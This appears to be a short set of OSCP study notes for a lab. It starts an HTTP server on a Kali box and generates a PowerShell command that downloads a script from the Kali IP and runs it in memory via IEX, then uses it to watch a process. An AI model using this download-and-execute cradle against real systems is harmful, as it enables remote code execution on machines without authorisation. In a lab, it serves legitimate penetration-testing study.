```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `(new-object net.webclient).downloadstring('http://${KaliIP}/Watch-Command.ps1') | IEX`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
Get-Process {backup} -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```

